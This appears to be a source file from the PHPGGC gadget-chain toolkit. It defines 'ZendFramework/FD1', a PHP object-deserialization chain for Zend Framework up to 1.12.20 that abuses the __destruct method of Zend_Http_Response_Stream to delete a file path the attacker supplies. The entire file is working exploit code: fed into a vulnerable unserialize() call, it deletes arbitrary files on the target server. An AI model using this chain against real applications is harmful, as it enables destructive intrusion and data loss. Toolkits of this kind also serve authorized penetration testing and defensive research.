<?php

namespace GadgetChain\ZendFramework;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '? <= 1.12.20';
    public static $vector = '__destruct';
    public static $author = 'mpchadwick';
    public static $parameters = [
        'remote_path'
    ];

    public function generate(array $parameters)
    {
        $file = $parameters['remote_path'];

        return new \Zend_Http_Response_Stream(
            true,
            $file
        );
    }
}